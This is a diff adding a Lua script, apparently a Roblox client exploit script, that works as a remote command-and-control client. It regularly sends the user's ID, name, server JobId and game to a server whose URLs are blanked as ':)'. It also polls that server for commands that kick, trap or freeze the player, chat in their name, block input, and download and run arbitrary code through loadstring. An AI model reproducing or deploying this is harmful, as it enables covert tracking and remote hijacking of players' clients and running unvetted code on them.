@@ -1,0 +1,330 @@
+local SERVER_READ_URL = ":)"
+local SERVER_SEND_URL = ":)"
+
+local HEARTBEAT_INTERVAL = 3
+local POLL_INTERVAL = 0.3
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local Debris = game:GetService("Debris")
+local MarketplaceService = game:GetService("MarketplaceService")
+local CoreGui = game:GetService("CoreGui")
+local StarterGui = game:GetService("StarterGui")
+
+local LocalPlayer = Players.LocalPlayer
+
+local lastCount = 0
+local activeLocalConnections = {}
+local gameName = "Unknown Game"
+
+local function safeHttpGet(url)
+	local success, result = pcall(function() return game:HttpGet(url) end)
+	if success and result then
+		return true, result
+	end
+	return false, result
+end
+
+local function safeJsonDecode(str)
+	local success, result = pcall(function() return HttpService:JSONDecode(str) end)
+	if success then
+		return result
+	end
+	return nil
+end
+
+task.spawn(function()
+	local success, result = pcall(function()
+		return MarketplaceService:GetProductInfo(game.PlaceId)
+	end)
+	if success and result and result.Name then
+		gameName = result.Name
+	end
+end)
+
+local Commands = {}
+
+Commands["rejoin"] = function()
+	pcall(function()
+		TeleportService:SetTeleportSetting("AdminSystemReinject", true)
+		TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
+	end)
+end
+
+Commands["joinme"] = function(args)
+	local jobId = args and args[1]
+	if jobId and jobId ~= "" then
+		pcall(TeleportService.TeleportToPlaceInstance, TeleportService, game.PlaceId, jobId, LocalPlayer)
+	end
+end
+
+Commands["blockchat"] = function()
+	pcall(function()
+		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
+	end)
+end
+
+Commands["unblockchat"] = function()
+	pcall(function()
+		StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
+	end)
+end
+
+Commands["sendchat"] = function(args)
+	local message = args and args[1]
+	if message and message ~= "" then
+		pcall(function()
+			local textChatService = game:GetService("TextChatService")
+			if textChatService and textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+				local generalChannel = textChatService.TextChannels:FindFirstChild("RBXGeneral")
+				if generalChannel then
+					generalChannel:SendAsync(message)
+					return
+				end
+			end
+			local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents", true)
+			if chatEvent then chatEvent = chatEvent:FindFirstChild("SayMessageRequest") end
+			if chatEvent then chatEvent:FireServer(message, "All") else LocalPlayer:Chat(message) end
+		end)
+	end
+end
+
+Commands["kill"] = function()
+	if LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
+		LocalPlayer.Character.Humanoid.Health = 0
+	end
+end
+
+Commands["kick"] = function(args)
+	local reason = (args and args[1]) or "You have been kicked."
+	pcall(function() LocalPlayer:Kick(reason) end)
+end
+
+Commands["freeze"] = function()
+	if LocalPlayer.Character then
+		for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+			if part:IsA("BasePart") then
+				pcall(function() part.Anchored = true end)
+			end
+		end
+	end
+end
+
+Commands["unfreeze"] = function()
+	if LocalPlayer.Character then
+		for _, part in ipairs(LocalPlayer.Character:GetDescendants()) do
+			if part:IsA("BasePart") then
+				pcall(function() part.Anchored = false end)
+			end
+		end
+	end
+end
+
+Commands["stopgame"] = function()
+	if CoreGui:FindFirstChild("StopGameOverlay") then return end
+	local stopGui = Instance.new("ScreenGui")
+	stopGui.Name = "StopGameOverlay"
+	stopGui.ResetOnSpawn = false
+	stopGui.IgnoreGuiInset = true
+	stopGui.Parent = CoreGui
+	
+	local inputBlocker = Instance.new("Frame", stopGui)
+	inputBlocker.Size = UDim2.new(2, 0, 2, 0)
+	inputBlocker.Position = UDim2.new(-0.5, 0, -0.5, 0)
+	inputBlocker.BackgroundTransparency = 1
+	inputBlocker.Active = true
+	inputBlocker.ZIndex = 9e9
+	
+	pcall(function() StarterGui:SetCore("TopbarEnabled", false) end)
+	activeLocalConnections["StopGame"] = UserInputService.InputBegan:Connect(function() end)
+end
+
+Commands["resumegame"] = function()
+	if CoreGui:FindFirstChild("StopGameOverlay") then CoreGui.StopGameOverlay:Destroy() end
+	if activeLocalConnections["StopGame"] then
+		activeLocalConnections["StopGame"]:Disconnect()
+		activeLocalConnections["StopGame"] = nil
+	end
+	pcall(function() StarterGui:SetCore("TopbarEnabled", true) end)
+end
+
+Commands["jail"] = function()
+	if LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
+		local jailName = "TheBox_" .. LocalPlayer.UserId
+		if workspace:FindFirstChild(jailName) then workspace[jailName]:Destroy() end
+		
+		local jailModel = Instance.new("Model", workspace)
+		jailModel.Name = jailName
+		
+		local rootPart = LocalPlayer.Character.PrimaryPart
+		local pos = rootPart.Position
+		local boxSize = 12
+		local wallThickness = 0.5
+		local half = boxSize / 2
+		
+		local wallData = {
+			{"Floor", Vector3.new(boxSize, wallThickness, boxSize), pos - Vector3.new(0, half, 0)},
+			{"Ceiling", Vector3.new(boxSize, wallThickness, boxSize), pos + Vector3.new(0, half, 0)},
+			{"Back", Vector3.new(boxSize, boxSize, wallThickness), pos - Vector3.new(0, 0, half)},
+			{"Front", Vector3.new(boxSize, boxSize, wallThickness), pos + Vector3.new(0, 0, half)},
+			{"Left", Vector3.new(wallThickness, boxSize, boxSize), pos - Vector3.new(half, 0, 0)},
+			{"Right", Vector3.new(wallThickness, boxSize, boxSize), pos + Vector3.new(half, 0, 0)}
+		}
+		
+		for _, data in ipairs(wallData) do
+			local wall = Instance.new("Part", jailModel)
+			wall.Size = data[2]
+			wall.Position = data[3]
+			wall.Anchored = true
+			wall.CanCollide = true
+			wall.BrickColor = BrickColor.Red()
+			wall.Material = Enum.Material.Neon
+			wall.Transparency = 0.6
+		end
+		rootPart.CFrame = CFrame.new(pos)
+	end
+end
+
+Commands["unjail"] = function()
+	local jailName = "TheBox_" .. LocalPlayer.UserId
+	if workspace:FindFirstChild(jailName) then
+		workspace[jailName]:Destroy()
+	end
+end
+
+Commands["kidnap"] = function()
+	if LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
+		local vanName = "UnmarkedVan_" .. LocalPlayer.UserId
+		if workspace:FindFirstChild(vanName) then workspace[vanName]:Destroy() end
+		
+		local rootPart = LocalPlayer.Character.PrimaryPart
+		rootPart.Anchored = true
+		
+		local van = Instance.new("Part", workspace)
+		van.Name = vanName
+		van.Size = Vector3.new(16, 8, 9)
+		van.Color = Color3.fromRGB(30, 30, 30)
+		van.Material = Enum.Material.Metal
+		van.CFrame = rootPart.CFrame * CFrame.new(0, -2, 40)
+		van.Anchored = true
+		
+		local sound = Instance.new("Sound", van)
+		sound.SoundId = "rbxassetid://5150874039"
+		sound.Volume = 8
+		sound.Looped = true
+		sound:Play()
+		
+		local tweenInfo = TweenInfo.new(1.2, Enum.EasingStyle.Quint, Enum.EasingDirection.In)
+		local approach = TweenService:Create(van, tweenInfo, {CFrame = rootPart.CFrame * CFrame.new(0, -2, 4)})
+		approach:Play()
+		approach.Completed:Wait()
+		
+		local weld = Instance.new("WeldConstraint", van)
+		weld.Part0 = van
+		weld.Part1 = rootPart
+		rootPart.Anchored = false
+		
+		local destination = van.CFrame * CFrame.new(0, 350, 0)
+		local departInfo = TweenInfo.new(3, Enum.EasingStyle.Exponential, Enum.EasingDirection.In)
+		local depart = TweenService:Create(van, departInfo, {CFrame = destination})
+		depart:Play()
+		
+		Debris:AddItem(van, 4)
+	end
+end
+
+Commands["um"] = function(args)
+	local message = args and args[1] or "Message"
+	local duration = (args and tonumber(args[2])) or 5
+	
+	local messageGui = Instance.new("ScreenGui")
+	messageGui.ResetOnSpawn = false
+	messageGui.IgnoreGuiInset = true
+	messageGui.Parent = CoreGui
+	
+	local label = Instance.new("TextLabel", messageGui)
+	label.Size = UDim2.new(0.8, 0, 0, 80)
+	label.AnchorPoint = Vector2.new(0.5, 0)
+	label.Position = UDim2.new(0.5, 0, 0.12, 0)
+	label.BackgroundTransparency = 1
+	label.Font = Enum.Font.SourceSansBold
+	label.TextSize = 36
+	label.TextColor3 = Color3.new(1, 1, 1)
+	label.TextStrokeColor3 = Color3.new(0, 0, 0)
+	label.TextStrokeTransparency = 0
+	label.Text = message
+	label.TextTransparency = 1
+	
+	for t = 1, 0, -0.1 do label.TextTransparency = t; task.wait(0.03) end
+	task.wait(duration)
+	for t = 0, 1, 0.1 do label.TextTransparency = t; task.wait(0.03) end
+	
+	messageGui:Destroy()
+end
+
+Commands["use"] = function(args)
+	local url = args and args[1]
+	if not url or url == "" then return end
+	
+	local success, scriptSource = pcall(function() return game:HttpGet(url) end)
+	if success and scriptSource then
+		local func, err = loadstring(scriptSource)
+		if func then
+			pcall(func)
+		end
+	end
+end
+
+task.spawn(function()
+	while true do
+		local payload = {
+			userId = LocalPlayer.UserId,
+			name = LocalPlayer.Name,
+			displayName = LocalPlayer.DisplayName,
+			jobId = game.JobId,
+			ts = os.time(),
+			gameName = gameName
+		}
+		local success, jsonPayload = pcall(HttpService.JSONEncode, HttpService, payload)
+		if success then
+			pcall(function() game:HttpGet(SERVER_SEND_URL .. "?text=" .. HttpService:UrlEncode(jsonPayload)) end)
+		end
+		task.wait(HEARTBEAT_INTERVAL)
+	end
+end)
+
+pcall(function()
+	local ok, resp = safeHttpGet(SERVER_READ_URL)
+	if ok then
+		local decoded = safeJsonDecode(resp)
+		if type(decoded) == "table" then
+			lastCount = #decoded
+		end
+	end
+end)
+
+task.spawn(function()
+	while true do
+		local ok, resp = safeHttpGet(SERVER_READ_URL)
+		if ok and resp then
+			local data = safeJsonDecode(resp)
+			if type(data) == "table" and #data > lastCount then
+				for i = lastCount + 1, #data do
+					local commandData = safeJsonDecode(data[i] or "")
+					if type(commandData) == "table" and commandData.cmd and commandData.target then
+						local funcToRun = Commands[commandData.cmd:lower()]
+						if funcToRun and (commandData.target == LocalPlayer.UserId or commandData.target == "all") then
+							pcall(funcToRun, commandData.args)
+						end
+					end
+				end
+				lastCount = #data
+			end
+		end
+		task.wait(POLL_INTERVAL)
+	end
+end)
